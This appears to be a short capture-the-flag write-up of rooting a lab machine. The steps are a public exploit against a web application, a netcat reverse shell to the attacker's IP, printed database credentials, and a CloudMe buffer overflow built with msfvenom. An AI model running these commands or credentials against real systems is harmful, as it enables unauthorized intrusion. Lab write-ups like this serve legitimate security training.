Port 8080:

- There is information disclosure that shows us the software that the webpage is using and its version:

## Exploitation

- Exploit:
`https://www.exploit-db.com/exploits/48506`

- Execute the python script: `python exploit.py http://10.10.10.198/`
- We now have a shell
- The shell was not persistent, therefore we uploaded a netcat executable on the victim machine with curl
- Once uploaded, we got a reverse shell connection:
`nc.exe -e cmd.exe 10.10.14.6 1234`

- We now have a shell that lets us navigate through the directories

## Post Exploitation

- We find an interesting text file in the website's directory:

```
C:\xampp\htdocs\gym>type "New Text Document".txt
type "New Text Document".txt
$mysql_host = "mysql16.000webhost.com";
$mysql_database = "a8743500_secure";
$mysql_user = "a8743500_secure";
$mysql_password = "ipad12345";
```

- We now have database credentials: `a8743500_secure:ipad12345`
- We discover a service "CloudMe" that is vulnerable to a BoF
- We use searchsploit to get the exploit and then create a new payload with msfvenom
- The exploit is simple, we listen on the port we gave when creating the payload, then we run the exploit and we get root.

P.S. I was in a rush and lost my opportunity to get screenshots.
